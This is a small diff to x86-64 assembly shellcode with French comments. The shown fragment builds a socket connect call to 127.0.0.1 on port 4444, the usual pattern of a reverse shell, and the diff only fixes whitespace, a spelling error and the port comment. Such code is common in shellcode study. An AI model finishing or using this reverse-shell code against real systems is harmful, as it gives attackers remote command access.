@@ -26,13 +26,13 @@ _start:
 
     ; Creation de la connection pour le socket
 
-    push 0x2a
+   push 0x2a
    pop rax   ; rdi -> fd
-   mov rdi, r9   ; Creation de la strcture du socket
+   mov rdi, r9   ; Creation de la structure du socket
    push rdx         ; pushing padding
    push rdx         ; pushing padding
    push 0x0101017f  ; Addresse (127.0.0.1)
-   push word 0x5c11 ; PORT (8080)
+   push word 0x5c11 ; PORT (4444)
    push word 0x02   ; AF_INET (2)   ; rsi -> addresse dans la strctur addrin
    mov rsi, rsp   ; rdx -> 16
    add rdx, 0x10   ; Execution du syscall
